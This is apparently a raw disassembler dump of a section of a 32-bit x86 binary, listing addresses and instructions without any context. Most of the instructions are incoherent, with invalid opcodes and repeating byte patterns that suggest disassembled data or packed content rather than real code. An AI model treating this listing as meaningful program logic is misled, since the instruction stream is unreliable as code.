  40a145:	out    dx,al
  40a146:	js     0x40a17c
  40a148:	inc    edx
  40a149:	xchg   esp,eax
  40a14a:	cmp    eax,0x31d8434a
  40a14f:	dec    ebx
  40a150:	and    BYTE PTR [ecx],al
  40a152:	test   al,0xa9
  40a154:	push   ss
  40a155:	or     eax,0xe5218078
  40a15a:	adc    dh,BYTE PTR [esp+0x50271dc9]
  40a161:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a162:	push   esp
  40a163:	or     al,0x52
  40a165:	fdivr  QWORD PTR [eax+0x2a]
  40a168:	and    DWORD PTR ds:0x436241,esp
  40a16e:	adc    BYTE PTR [eax+0x0],al
  40a171:	add    eax,0x62410040
  40a176:	inc    eax
  40a177:	add    BYTE PTR [ebx-0x34],al
  40a17a:	inc    eax
  40a17b:	add    eax,0x78434040
  40a180:	bound  eax,QWORD PTR [ecx+0x78]
  40a183:	add    eax,0x62404043
  40a188:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a189:	inc    ecx
  40a18a:	das    
  40a18b:	fmul   DWORD PTR ds:0x972d0e15
  40a191:	leave  
  40a192:	or     eax,0x378cbc0
  40a197:	imul   ecx,DWORD PTR [eax],0x46f43c7c
  40a19d:	add    cl,cl
  40a19f:	loope  0x40a12d
  40a1a1:	bound  eax,QWORD PTR [edi]
  40a1a3:	bound  eax,QWORD PTR [ecx+eax*2+0x40]
  40a1a7:	add    eax,0x43436240
  40a1ac:	add    eax,0x62004040
  40a1b1:	inc    eax
  40a1b2:	add    BYTE PTR [ecx+0x40],al
  40a1b5:	inc    ebx
  40a1b6:	test   BYTE PTR ds:0x58054041,ah
  40a1bc:	inc    eax
  40a1bd:	inc    eax
  40a1be:	bound  eax,QWORD PTR [eax+0x66]
  40a1c1:	inc    ecx
  40a1c2:	inc    eax
  40a1c3:	add    eax,0x40817800
  40a1c8:	mov    esi,0x5f08441
  40a1cd:	outs   dx,DWORD PTR ds:[esi]
  40a1ce:	inc    esi
  40a1cf:	and    bh,dh
  40a1d1:	cwde   
  40a1d2:	je     0x40a194
  40a1d4:	and    BYTE PTR [eax+0x0],bh
  40a1d7:	sub    ebp,ebx
  40a1d9:	int3   
  40a1da:	push   ebx
  40a1db:	add    BYTE PTR [eax],al
  40a1dd:	inc    ebx
  40a1de:	inc    eax
  40a1df:	bound  eax,QWORD PTR ds:0x25404110
  40a1e5:	add    ah,cl
  40a1e7:	inc    ebx
  40a1e8:	add    eax,0x40402562
  40a1ed:	add    BYTE PTR [eax+0x40],al
  40a1f0:	inc    ecx
  40a1f1:	inc    ecx
  40a1f2:	add    eax,0x78434025
  40a1f7:	bound  eax,QWORD PTR [eax-0x7c]
  40a1fa:	inc    eax
  40a1fb:	inc    ecx
  40a1fc:	adc    BYTE PTR [ecx],al
  40a1fe:	arpl   WORD PTR [esi],cx
  40a200:	sbb    ebx,DWORD PTR [eax]
  40a202:	test   al,0xdd
  40a204:	test   al,0x30
  40a206:	js     0x40a24a
  40a208:	bound  edx,QWORD PTR [esi+0x10]
  40a20b:	dec    edi
  40a20c:	inc    eax
  40a20d:	and    al,0x5b
  40a20f:	sub    BYTE PTR [esi-0x6c],0x4c
  40a213:	dec    esp
  40a214:	inc    eax
  40a215:	jle    0x40a258
  40a217:	inc    eax
  40a218:	inc    eax
  40a219:	inc    ebx
  40a21a:	int3   
  40a21b:	add    BYTE PTR ds:0x56240,al
  40a221:	inc    ebx
  40a222:	inc    eax
  40a223:	inc    eax
  40a224:	add    BYTE PTR [ecx+0x62],al
  40a227:	bound  eax,QWORD PTR [eax]
  40a229:	int3   
  40a22a:	inc    eax
  40a22b:	inc    ebx
  40a22c:	add    eax,0x43624041
  40a231:	adc    BYTE PTR [ecx+0x5],al
  40a234:	inc    eax
  40a235:	ja     0x40a238
  40a237:	data16 xchg BYTE PTR [ecx+0x67],al
  40a23b:	push   ebx
  40a23c:	test   al,0x91
  40a23e:	inc    eax
  40a23f:	popa   
  40a240:	lds    edx,FWORD PTR [edi+0x72]
  40a243:	enter  0x7710,0xd
  40a247:	inc    eax
  40a248:	mov    dl,0x30
  40a24a:	sub    al,0x28
  40a24c:	inc    ecx
  40a24d:	clc    
  40a24e:	test   al,0x60
  40a250:	jg     0x40a2a1
  40a252:	adc    BYTE PTR [esi+edx*1+0x77],al
  40a256:	inc    eax
  40a257:	outs   dx,DWORD PTR ds:[esi]
  40a258:	xabort 0x94
  40a25b:	jp     0x40a2d5
  40a25d:	(bad)  
  40a25e:	pop    ds
  40a25f:	xchg   esi,eax
  40a260:	add    DWORD PTR [eax],ebx
  40a262:	inc    edi
  40a263:	and    BYTE PTR [edx+0x77],ah
  40a266:	inc    edx
  40a267:	sub    eax,0x4362dbbd
  40a26c:	inc    eax
  40a26d:	adc    BYTE PTR ds:0x4158cc40,al
  40a273:	inc    ebx
  40a274:	bound  eax,QWORD PTR [ecx+0x40]
  40a277:	add    eax,0x4140
  40a27c:	and    eax,0x40400062
  40a281:	add    eax,0x84404340
  40a286:	int3   
  40a287:	js     0x40a289
  40a289:	inc    ecx
  40a28a:	adc    BYTE PTR [edx+0xf],ah
  40a28d:	pop    edi
  40a28e:	(bad)  
  40a28f:	aad    0x36
  40a291:	add    BYTE PTR [edx+0x21b9a824],ah
  40a297:	les    esi,FWORD PTR [edi+0x3]
  40a29a:	xor    al,0x5e
  40a29c:	adc    DWORD PTR [ebp+0x402cdf20],edi
  40a2a2:	xor    DWORD PTR [edi-0x359db4bc],esp
  40a2a8:	ja     0x40a2b3
  40a2aa:	loope  0x40a267
  40a2ac:	inc    edx
  40a2ad:	jp     0x40a2e3
  40a2af:	fsub   QWORD PTR [edi]
  40a2b1:	inc    eax
  40a2b2:	js     0x40a24c
  40a2b4:	pop    ecx
  40a2b5:	sub    al,BYTE PTR [eax+0x40414000]
  40a2bb:	inc    ebx
  40a2bc:	bound  ax,DWORD PTR ds:0x40434100
  40a2c3:	add    eax,0x40054062
  40a2c8:	bound  eax,QWORD PTR [ecx+0x40]
  40a2cb:	inc    ebx
  40a2cc:	inc    eax
  40a2cd:	add    eax,0x25405841
  40a2d2:	bound  eax,QWORD PTR [eax+0x43]
  40a2d5:	inc    eax
  40a2d6:	adc    BYTE PTR [edi],al
  40a2d8:	ja     0x40a2f0
  40a2da:	loop   0x40a305
  40a2dc:	aam    0xcd
  40a2de:	lds    ebp,FWORD PTR [ecx+0x7]
  40a2e1:	pusha  
  40a2e2:	mov    al,es:0x62482d35
  40a2e8:	ja     0x40a32a
  40a2ea:	dec    ebp
  40a2eb:	mov    ebp,DWORD PTR [edx+0x21]
  40a2ee:	retf   
  40a2ef:	inc    esp
  40a2f0:	pop    ecx
  40a2f1:	adc    ah,BYTE PTR [edx+0xe]
  40a2f4:	jge    0x40a2ae
  40a2f6:	push   esp
  40a2f7:	cmp    al,0x77
  40a2f9:	inc    eax
  40a2fa:	sub    dh,cl
  40a2fc:	bound  ecx,QWORD PTR ds:0x40434140
  40a302:	add    eax,0x43406262
  40a307:	inc    ecx
  40a308:	adc    BYTE PTR [eax],al
  40a30a:	inc    eax
  40a30b:	add    eax,0x43000562
  40a310:	add    BYTE PTR [ecx+0x40],al
  40a313:	inc    eax
  40a314:	add    eax,0x400062
  40a319:	inc    ebx
  40a31a:	inc    eax
  40a31b:	js     0x40a35e
  40a31d:	inc    ecx
  40a31e:	bound  eax,QWORD PTR [eax+0x44]
  40a321:	fcom   QWORD PTR [ecx+0x5]
  40a324:	push   esi
  40a325:	sbb    BYTE PTR [ebx-0x37],ah
  40a328:	rol    DWORD PTR ds:0xa6814077,0x3c
  40a32f:	es ins DWORD PTR es:[edi],dx
  40a331:	xchg   DWORD PTR [eax+0x13],ecx
  40a334:	bound  eax,QWORD PTR [eax+0x5]
  40a337:	inc    ecx
  40a338:	add    BYTE PTR [ebx+0x40],al
  40a33b:	inc    eax
  40a33c:	inc    ecx
  40a33d:	inc    eax
  40a33e:	inc    eax
  40a33f:	bound  eax,QWORD PTR ds:0x5624300
  40a345:	add    BYTE PTR [eax+0x40],al
  40a348:	add    BYTE PTR [ecx+0x43],al
  40a34b:	add    BYTE PTR [eax+0x41],al
  40a34e:	add    eax,0x40436200
  40a353:	inc    eax
  40a354:	add    eax,0x4009f562
  40a359:	mov    DWORD PTR [eax+0x6740766a],ebp
  40a35f:	lods   eax,DWORD PTR ds:[esi]
  40a360:	mov    al,0x73
  40a362:	adc    dh,BYTE PTR [edi]
  40a364:	mul    BYTE PTR [ebp-0x7e]
  40a367:	push   ds
  40a368:	mov    dh,BYTE PTR [esi+0x4076d4bc]
  40a36e:	jp     0x40a33a
  40a370:	fadd   QWORD PTR [ecx+eax*2+0x5]
  40a374:	sub    al,BYTE PTR [ecx+0x40]
  40a377:	add    eax,0x41624340
  40a37c:	test   BYTE PTR [eax],al
  40a37e:	and    eax,0x404043
  40a383:	add    BYTE PTR ds:0x626210,al
  40a389:	add    eax,0x43404140
  40a38e:	inc    eax
  40a38f:	inc    ecx
  40a390:	add    eax,0x10664062
  40a395:	inc    ebx
  40a396:	bound  edi,QWORD PTR [esi]
  40a398:	dec    edi
  40a399:	shl    BYTE PTR [edx+0x46],1
  40a39c:	ins    DWORD PTR es:[edi],dx
  40a39d:	jnp    0x40a415
  40a39f:	add    DWORD PTR [eax],eax
  40a3a1:	xor    al,0xc8
  40a3a3:	mov    ah,0x34
  40a3a5:	dec    eax
  40a3a6:	sbb    dl,BYTE PTR [ecx]
  40a3a8:	mov    edx,0x63b46217
  40a3ad:	add    eax,0x9b408076
  40a3b2:	mov    eax,0x7fcb9415
  40a3b7:	and    eax,0x41646a31
  40a3bc:	or     eax,0x40497592
  40a3c1:	stos   BYTE PTR es:[edi],al
  40a3c2:	mov    ah,0xe2
  40a3c4:	int    0xbf
  40a3c6:	mov    edx,0x4041cc05
  40a3cb:	add    BYTE PTR [eax],al
  40a3cd:	add    BYTE PTR [eax+0x40],al
  40a3d0:	inc    ebx
  40a3d1:	bound  eax,QWORD PTR [eax]
  40a3d3:	inc    eax
  40a3d4:	inc    eax
  40a3d5:	add    eax,0x62434162
  40a3da:	inc    eax
  40a3db:	js     0x40a3ed
  40a3dd:	inc    ecx
  40a3de:	add    eax,0x5404325
  40a3e3:	bound  eax,QWORD PTR [eax+0x40]
  40a3e6:	inc    ecx
  40a3e7:	inc    ebx
  40a3e8:	add    DWORD PTR [ecx],esp
  40a3ea:	jae    0x40a401
  40a3ec:	cli    
  40a3ed:	outs   dx,DWORD PTR ds:[esi]
  40a3ee:	dec    edx
  40a3ef:	jne    0x40a442
  40a3f1:	loopne 0x40a401
  40a3f3:	retf   
  40a3f4:	mov    dl,0x34
  40a3f6:	aad    0xb2
  40a3f8:	add    DWORD PTR [edx-0x37],edi
  40a3fb:	adc    cl,BYTE PTR ds:0x4275b441
  40a401:	ud2    
  40a403:	add    DWORD PTR [ecx-0x6c],0x62
  40a407:	lods   al,BYTE PTR ds:[esi]
  40a408:	add    BYTE PTR [ebx+0x40],al
  40a40b:	inc    edi
  40a40c:	ret    
  40a40d:	cmp    eax,0x16e757c
  40a412:	inc    eax
  40a413:	xchg   edx,eax
  40a414:	das    
  40a415:	ret    
  40a416:	js     0x40a3b2
  40a418:	sub    al,0x4e
  40a41a:	inc    eax
  40a41b:	sar    ecx,0x75
  40a41e:	and    eax,0x436241
  40a423:	adc    BYTE PTR [eax+0x0],al
  40a426:	add    eax,0x62410040
  40a42b:	inc    eax
  40a42c:	add    BYTE PTR [ebx-0x34],al
  40a42f:	inc    eax
  40a430:	add    eax,0x78434040
  40a435:	bound  eax,QWORD PTR [ecx+0x78]
  40a438:	add    eax,0x62404043
  40a43d:	bound  esi,QWORD PTR [ebp+0x0]
  40a440:	add    BYTE PTR [esi-0x30],0xb0
  40a444:	xor    al,0x8f
  40a446:	int3   
  40a447:	popf   
  40a448:	les    ebx,FWORD PTR ss:[eax*1+0x7e757b48]
  40a450:	inc    edx
  40a451:	adc    ah,BYTE PTR [edx+0x41]
  40a454:	lds    ebp,FWORD PTR [eax+0x4041c90e]
  40a45a:	add    eax,0x43436240
  40a45f:	add    eax,0x62004040
  40a464:	inc    eax
  40a465:	add    BYTE PTR [ecx+0x40],al
  40a468:	inc    ebx
  40a469:	test   BYTE PTR ds:0x58054041,ah
  40a46f:	inc    eax
  40a470:	inc    eax
  40a471:	bound  eax,QWORD PTR [eax+0x66]
  40a474:	inc    ecx
  40a475:	inc    eax
  40a476:	add    eax,0x40400100
  40a47b:	inc    ecx
  40a47c:	xor    BYTE PTR [eax+0x75],al
  40a47f:	test   DWORD PTR [esi],eax
  40a481:	adc    eax,0x1d2c004
  40a486:	outs   dx,DWORD PTR ds:[esi]
  40a487:	rol    DWORD PTR [ebx+0x4326740],0x9d
  40a48e:	jne    0x40a41e
  40a490:	outs   dx,BYTE PTR ds:[esi]
  40a491:	pop    edx
  40a493:	clc    
  40a494:	push   edx
  40a495:	clc    
  40a496:	inc    ebx
  40a497:	sub    BYTE PTR [ecx],cl
  40a499:	inc    edi
  40a49a:	test   al,0xae
  40a49c:	inc    esp
  40a49d:	sub    BYTE PTR [esp+edi*1+0x78],dh
  40a4a1:	pusha  
  40a4a2:	inc    ebx
  40a4a3:	adc    eax,0x40430000
  40a4a8:	bound  eax,QWORD PTR ds:0x25404110
  40a4ae:	add    ah,cl
  40a4b0:	inc    ebx
  40a4b1:	add    eax,0x40402562
  40a4b6:	add    BYTE PTR [eax+0x40],al
  40a4b9:	inc    ecx
  40a4ba:	inc    ecx
  40a4bb:	add    eax,0x78434025
  40a4c0:	bound  eax,QWORD PTR [eax-0x7c]
  40a4c3:	inc    eax
  40a4c4:	inc    ecx
  40a4c5:	les    eax,FWORD PTR [ebp-0x5b]
  40a4c8:	sbb    DWORD PTR [ebp+0xe412a40],0xffffffb9
  40a4cf:	je     0x40a4e5
  40a4d1:	scas   eax,DWORD PTR es:[edi]
  40a4d2:	push   ecx
  40a4d3:	inc    ecx
  40a4d4:	inc    ecx
  40a4d5:	test   al,0xd8
  40a4d7:	fisttp WORD PTR [edx]
  40a4d9:	dec    eax
  40a4da:	cmp    DWORD PTR [eax],ecx
  40a4dc:	rcl    BYTE PTR [edx],0x62
  40a4df:	je     0x40a55b
  40a4e1:	or     DWORD PTR [eax+eiz*2],0x6d4ac2d
  40a4e8:	adc    al,0x4e
  40a4ea:	inc    eax
  40a4eb:	(bad)  
  40a4ec:	cli    
  40a4ed:	inc    ecx
  40a4ee:	inc    eax
  40a4ef:	inc    eax
  40a4f0:	inc    ebx
  40a4f1:	int3   
  40a4f2:	add    BYTE PTR ds:0x56240,al
  40a4f8:	inc    ebx
  40a4f9:	inc    eax
  40a4fa:	inc    eax
  40a4fb:	add    BYTE PTR [ecx+0x62],al
  40a4fe:	bound  eax,QWORD PTR [eax]
  40a500:	int3   
  40a501:	inc    eax
  40a502:	inc    ebx
  40a503:	add    eax,0x43624041
  40a508:	adc    BYTE PTR [ecx+0x5],al
  40a50b:	inc    eax
  40a50c:	push   edi
  40a50d:	add    eax,0xd02dd74
  40a512:	pop    ebx
  40a513:	lods   al,BYTE PTR ds:[esi]
  40a514:	bound  eax,QWORD PTR [edi+0x402f2d77]
  40a51a:	inc    eax
  40a51b:	or     eax,0x5d742b94
  40a520:	pop    es
  40a521:	adc    al,0x5
  40a523:	inc    ecx
  40a524:	or     eax,0x4c16e27
  40a529:	inc    eax
  40a52a:	addr16 inc ecx
  40a52c:	shl    BYTE PTR fs:[esi+eiz*2-0x5f],1
  40a531:	or     BYTE PTR [esi-0x40],ch
  40a534:	cmp    al,BYTE PTR ds:0x44fec465
  40a53a:	bound  eax,QWORD PTR [ebx+0x40]
  40a53d:	adc    BYTE PTR ds:0x4158cc40,al
  40a543:	inc    ebx
  40a544:	bound  eax,QWORD PTR [ecx+0x40]
  40a547:	add    eax,0x4140
  40a54c:	and    eax,0x40400062
  40a551:	add    eax,0x84404340
  40a556:	int3   
  40a557:	js     0x40a559
  40a559:	inc    ecx
  40a55a:	adc    BYTE PTR [edx+0xf],ah
  40a55d:	jl     0x40a584
  40a55f:	rol    DWORD PTR [edi+0x40012174],cl
  40a565:	(bad)  
  40a566:	stc    
  40a567:	(bad)  
  40a568:	int3   
  40a569:	push   esp
  40a56a:	adc    eax,0xaa67fc69
  40a56f:	dec    edi
  40a570:	add    BYTE PTR [eax+0x41],al
  40a573:	inc    eax
  40a574:	inc    ebx
  40a575:	bound  ax,DWORD PTR ds:0x40434100
  40a57c:	add    eax,0x40054062
  40a581:	bound  eax,QWORD PTR [ecx+0x40]
  40a584:	inc    ebx
  40a585:	inc    eax
  40a586:	add    eax,0x25405841
  40a58b:	bound  eax,QWORD PTR [eax+0x43]
  40a58e:	inc    eax
  40a58f:	adc    BYTE PTR ds:0x4781c273,cl
  40a595:	cmp    al,0x5
  40a597:	add    cl,cl
  40a599:	mov    ecx,0x6260412e
  40a59e:	inc    ecx
  40a59f:	sti    
  40a5a0:	mov    WORD PTR [ebx+0x49],?
  40a5a3:	and    BYTE PTR [esi],0x6d
  40a5a6:	inc    edx
  40a5a7:	bound  ecx,QWORD PTR ds:0x4897c1a8
  40a5ad:	retf   0x8ec4
  40a5b0:	int    0x73
  40a5b2:	and    ch,BYTE PTR [edi]
  40a5b4:	(bad)  
  40a5b5:	int    0x34
  40a5b7:	push   esp
  40a5b8:	enter  0xc390,0x5d
  40a5bc:	inc    eax
  40a5bd:	(bad)  
  40a5be:	clc    
  40a5bf:	bound  eax,QWORD PTR ds:0x18058c71
  40a5c5:	ds test al,0xf0
  40a5c8:	inc    eax
  40a5c9:	inc    ecx
  40a5ca:	inc    ebx
  40a5cb:	inc    eax
  40a5cc:	add    eax,0x43406262
  40a5d1:	inc    ecx
  40a5d2:	adc    BYTE PTR [eax],al
  40a5d4:	inc    eax
  40a5d5:	add    eax,0x43000562
  40a5da:	add    BYTE PTR [ecx+0x40],al
  40a5dd:	inc    eax
  40a5de:	add    eax,0x400062
  40a5e3:	inc    ebx
  40a5e4:	inc    eax
  40a5e5:	js     0x40a628
  40a5e7:	inc    ecx
  40a5e8:	bound  eax,QWORD PTR [eax-0x37]
  40a5eb:	mov    edx,0xb44055c1
  40a5f0:	adc    eax,0x9740f8c4
  40a5f5:	add    DWORD PTR [ebx+eiz*2],edx
  40a5f8:	inc    ecx
  40a5f9:	bound  eax,QWORD PTR ds:0x40773040
  40a5ff:	out    0x42,al
  40a601:	dec    esp
  40a602:	int    0x40
  40a604:	rol    DWORD PTR [edx+0x44e4a86e],0xc4
  40a60b:	and    al,ah
  40a60d:	adc    BYTE PTR [eax+0x41],al
  40a610:	cli    
  40a611:	bound  eax,QWORD PTR [eax+0x5]
  40a614:	inc    ecx
  40a615:	add    BYTE PTR [ebx+0x40],al
  40a618:	inc    eax
  40a619:	inc    ecx
  40a61a:	inc    eax
  40a61b:	inc    eax
  40a61c:	bound  eax,QWORD PTR ds:0x5624300
  40a622:	add    BYTE PTR [eax+0x40],al
  40a625:	add    BYTE PTR [ecx+0x43],al
  40a628:	add    BYTE PTR [eax+0x41],al
  40a62b:	add    eax,0x40436200
  40a630:	inc    eax
  40a631:	add    eax,0x4015d962
  40a636:	ret    0xe10
  40a639:	sub    ah,BYTE PTR [esi+0x3241c930]
  40a63f:	push   ds
  40a640:	inc    eax
  40a641:	adc    cl,BYTE PTR ds:0x4f40b0a8
  40a647:	outs   dx,BYTE PTR ds:[esi]
  40a648:	cmovb  eax,DWORD PTR [ecx+0x2f]
  40a64c:	adc    eax,0x4040c540
  40a651:	add    al,0xc3
  40a653:	inc    ecx
  40a654:	inc    eax
  40a655:	add    eax,0x41624340
  40a65a:	test   BYTE PTR [eax],al
  40a65c:	and    eax,0x404043
  40a661:	add    BYTE PTR ds:0x626210,al
  40a667:	add    eax,0x43404140
  40a66c:	inc    eax
  40a66d:	inc    ecx
  40a66e:	add    eax,0x10664062
  40a673:	inc    ebx
  40a674:	(bad)  
  40a675:	fmulp  st(5),st
  40a677:	jg     0x40a69c
  40a679:	xor    al,0x9
  40a67b:	sar    BYTE PTR [ecx],1
  40a67d:	(bad)  
  40a67e:	rcr    BYTE PTR [ebx+eax*8+0x2c],0x40
  40a683:	(bad)  
  40a684:	stc    
  40a685:	lahf   
  40a686:	or     eax,0x1480557f
  40a68b:	add    DWORD PTR [eax+eax*8+0x2c04cc9],esp
  40a692:	inc    eax
  40a693:	leave  
  40a694:	or     BYTE PTR [edx-0x60],al
  40a697:	jge    0x40a6bc
  40a699:	pop    ss
  40a69a:	add    ecx,DWORD PTR [eax-0x25]
  40a69d:	inc    eax
  40a69e:	or     eax,0x41cc05a6
  40a6a3:	inc    eax
  40a6a4:	add    BYTE PTR [eax],al
  40a6a6:	add    BYTE PTR [eax+0x40],al
  40a6a9:	inc    ebx
  40a6aa:	bound  eax,QWORD PTR [eax]
  40a6ac:	inc    eax
  40a6ad:	inc    eax
  40a6ae:	add    eax,0x62434162
  40a6b3:	inc    eax
  40a6b4:	js     0x40a6c6
  40a6b6:	inc    ecx
  40a6b7:	add    eax,0x5404325
  40a6bc:	bound  eax,QWORD PTR [eax+0x40]
  40a6bf:	inc    ecx
  40a6c0:	inc    ebx
  40a6c1:	pop    ebp
  40a6c2:	call   0x6780b407
  40a6c7:	int    0x7d
  40a6c9:	rol    DWORD PTR [ecx],0x15
  40a6cc:	retf   
  40a6cd:	xor    ebp,DWORD PTR [eax]
  40a6cf:	mov    edi,0x40459d86
  40a6d4:	inc    edx
  40a6d5:	clc    
  40a6d6:	inc    eax
  40a6d7:	mov    edi,0x1280557d
  40a6dc:	dec    esi
  40a6dd:	ds inc eax
  40a6df:	mov    edi,0x4039c2da
  40a6e4:	int3   
  40a6e5:	inc    ecx
  40a6e6:	inc    eax
  40a6e7:	cmp    al,0x7d
  40a6e9:	xor    al,0x42
  40a6eb:	and    eax,0x436241
  40a6f0:	adc    BYTE PTR [eax+0x0],al
  40a6f3:	add    eax,0x62410040
  40a6f8:	inc    eax
  40a6f9:	add    BYTE PTR [ebx-0x34],al
  40a6fc:	inc    eax
  40a6fd:	add    eax,0x78434040
  40a702:	bound  eax,QWORD PTR [ecx+0x78]
  40a705:	add    eax,0x62404043
  40a70a:	adc    al,0xde
  40a70c:	or     eax,0x59c8c58b
  40a711:	add    BYTE PTR [eax-0x76],0xe4
  40a715:	(bad)  
  40a716:	leave  
  40a717:	jge    0x40a6d9
  40a719:	add    edx,DWORD PTR [ebx]
  40a71b:	test   al,0x49
  40a71d:	dec    edi
  40a71e:	loopne 0x40a747
  40a720:	and    ebx,DWORD PTR [edx]
  40a722:	inc    eax
  40a723:	adc    bh,ah
  40a725:	inc    edi
  40a726:	add    eax,0xe46797d
  40a72b:	push   esp
  40a72c:	inc    ecx
  40a72d:	inc    eax
  40a72e:	add    eax,0x43436240
  40a733:	add    eax,0x62004040
  40a738:	inc    eax
  40a739:	add    BYTE PTR [ecx+0x40],al
  40a73c:	inc    ebx
  40a73d:	test   BYTE PTR ds:0x58054041,ah
  40a743:	inc    eax
  40a744:	inc    eax
  40a745:	bound  eax,QWORD PTR [eax+0x66]
  40a748:	inc    ecx
  40a749:	inc    eax
  40a74a:	add    eax,0xcd8d6900
  40a74f:	push   ds
  40a750:	rol    DWORD PTR [ecx],0x40
  40a753:	adc    DWORD PTR [esp+edx*8+0x40],ebx
  40a757:	jge    0x40a7b7
  40a759:	dec    DWORD PTR [ecx]
  40a75b:	inc    ebx
  40a75c:	jns    0x40a79d
  40a75e:	pushf  
  40a75f:	adc    eax,ecx
  40a761:	add    DWORD PTR [eax+0x4c],eax
  40a764:	fstp   st(0)
  40a766:	add    eax,0x1fd54474
  40a76b:	and    al,0x47
  40a76d:	bound  eax,QWORD PTR [esi+0x4081c141]
  40a773:	bound  ecx,QWORD PTR [edx+edx*8]
  40a776:	sub    eax,0x14625273
  40a77b:	cwde   
  40a77c:	ins    BYTE PTR es:[edi],dx
  40a77d:	dec    eax
  40a77e:	fwait
  40a77f:	or     al,bl
  40a781:	push   es
  40a782:	inc    eax
  40a783:	inc    ebx
  40a784:	pushf  
  40a785:	add    BYTE PTR [eax],al
  40a787:	inc    ebx
  40a788:	inc    eax
  40a789:	bound  eax,QWORD PTR ds:0x25404110
  40a78f:	add    ah,cl
  40a791:	inc    ebx
  40a792:	add    eax,0x40402562
  40a797:	add    BYTE PTR [eax+0x40],al
  40a79a:	inc    ecx
  40a79b:	inc    ecx
  40a79c:	add    eax,0x78434025
  40a7a1:	bound  eax,QWORD PTR [eax-0x7c]
  40a7a4:	inc    eax
  40a7a5:	inc    ecx
  40a7a6:	push   edx
  40a7a7:	add    eax,0x102cef73
  40a7ac:	sub    BYTE PTR ds:0x720486c0,al
  40a7b2:	cs inc eax
  40a7b4:	push   cs
  40a7b5:	retf   
  40a7b6:	dec    ebx
  40a7b7:	das    
  40a7b8:	jae    0x40a77b
  40a7ba:	sbb    DWORD PTR [ecx],0x9a217ca8
  40a7c0:	imul   ebp,DWORD PTR [eax+0x42],0x40
  40a7c4:	adc    ah,BYTE PTR [edi]
  40a7c6:	xlat   BYTE PTR ds:[ebx]
  40a7c7:	add    eax,0x1281c273
  40a7cc:	push   esp
  40a7cd:	inc    ecx
  40a7ce:	inc    eax
  40a7cf:	inc    eax
  40a7d0:	inc    ebx
  40a7d1:	int3   
  40a7d2:	add    BYTE PTR ds:0x56240,al
  40a7d8:	inc    ebx
  40a7d9:	inc    eax
  40a7da:	inc    eax
  40a7db:	add    BYTE PTR [ecx+0x62],al
  40a7de:	bound  eax,QWORD PTR [eax]
  40a7e0:	int3   
  40a7e1:	inc    eax
  40a7e2:	inc    ebx
  40a7e3:	add    eax,0x43624041
  40a7e8:	adc    BYTE PTR [ecx+0x5],al
  40a7eb:	inc    eax
  40a7ec:	pushf  
  40a7ed:	test   al,0x86
  40a7ef:	pop    ebx
  40a7f0:	xor    eax,0x7c414054
  40a7f5:	xchg   ecx,eax
  40a7f6:	and    eax,DWORD PTR [eax+0x73]
  40a7f9:	add    BYTE PTR [ebx],0x2
  40a7fc:	and    eax,0xc24099ca
  40a801:	mov    bh,0x40
  40a803:	clc    
  40a804:	mov    esp,0x3340054f
  40a809:	xor    eax,0x40056405
  40a80e:	xchg   BYTE PTR [edi+eiz*2+0x75],ah
  40a812:	inc    eax
  40a813:	inc    esp
  40a814:	retf   
  40a815:	jg     0x40a885
  40a817:	inc    eax
  40a818:	ret    0x6280
  40a81b:	inc    ebx
  40a81c:	inc    eax
  40a81d:	adc    BYTE PTR ds:0x4158cc40,al
  40a823:	inc    ebx
  40a824:	bound  eax,QWORD PTR [ecx+0x40]
  40a827:	add    eax,0x4140
  40a82c:	and    eax,0x40400062
  40a831:	add    eax,0x84404340
  40a836:	int3   
  40a837:	js     0x40a839
  40a839:	inc    ecx
  40a83a:	adc    BYTE PTR [edx+0xf],ah
  40a83d:	add    al,0x2
  40a83f:	push   esp
  40a840:	sub    BYTE PTR [eax+0x5a210440],bl
  40a846:	add    DWORD PTR ds:0x4ab00541,edx
  40a84c:	push   esp
  40a84d:	inc    eax
  40a84e:	arpl   bx,cx
  40a850:	and    eax,DWORD PTR [esi+0x360dc040]
  40a856:	xchg   ecx,eax
  40a857:	dec    eax
  40a858:	clc    
  40a859:	xor    bh,BYTE PTR [esi-0x6b]
  40a85c:	rcr    al,1
  40a85e:	bound  esi,QWORD PTR [edx+eiz*2]
  40a861:	xchg   edi,eax
  40a862:	xor    eax,0xcd62006e
  40a867:	inc    eax
  40a868:	pop    ebx
  40a869:	add    eax,0x4074d07e
  40a86e:	inc    ebx
  40a86f:	push   esp
  40a870:	mov    esp,0xc20c86
  40a875:	inc    eax
  40a876:	inc    ecx
  40a877:	inc    eax
  40a878:	inc    ebx
  40a879:	bound  ax,DWORD PTR ds:0x40434100
  40a880:	add    eax,0x40054062
  40a885:	bound  eax,QWORD PTR [ecx+0x40]
  40a888:	inc    ebx
  40a889:	inc    eax
  40a88a:	add    eax,0x25405841
  40a88f:	bound  eax,QWORD PTR [eax+0x43]
  40a892:	inc    eax
  40a893:	adc    BYTE PTR ds:0x703dc040,bh
  40a899:	and    DWORD PTR [esi+0x21],edi
  40a89c:	add    al,BYTE PTR [eax+0x29]
  40a89f:	ret    
  40a8a0:	sub    edx,DWORD PTR [esi+0x236d0076]
  40a8a6:	test   al,0x48
  40a8a8:	fadd   QWORD PTR ds:0x411ac27e
  40a8ae:	adc    cl,cl
  40a8b0:	inc    eax
  40a8b1:	xchg   BYTE PTR [esi+0x33],cl
  40a8b4:	sbb    al,0x40
  40a8b6:	inc    ecx
  40a8b7:	inc    ebx
  40a8b8:	inc    eax
  40a8b9:	add    eax,0x43406262
  40a8be:	inc    ecx
  40a8bf:	adc    BYTE PTR [eax],al
  40a8c1:	inc    eax
  40a8c2:	add    eax,0x43000562
  40a8c7:	add    BYTE PTR [ecx+0x40],al
  40a8ca:	inc    eax
  40a8cb:	add    eax,0x400062
  40a8d0:	inc    ebx
  40a8d1:	inc    eax
  40a8d2:	js     0x40a915
  40a8d4:	inc    ecx
  40a8d5:	bound  eax,QWORD PTR [eax+0x2e]
  40a8d8:	push   esp
  40a8d9:	mov    eax,0x87d372c
  40a8de:	sbb    al,0x41
  40a8e1:	or     eax,0xc18795d3
  40a8e6:	adc    esp,DWORD PTR [edx+0x49]
  40a8e9:	retf   
  40a8ea:	bound  eax,QWORD PTR [eax+0x5]
  40a8ed:	inc    ecx
  40a8ee:	add    BYTE PTR [ebx+0x40],al
  40a8f1:	inc    eax
  40a8f2:	inc    ecx
  40a8f3:	inc    eax
  40a8f4:	inc    eax
  40a8f5:	bound  eax,QWORD PTR ds:0x5624300
  40a8fb:	add    BYTE PTR [eax+0x40],al
  40a8fe:	add    BYTE PTR [ecx+0x43],al
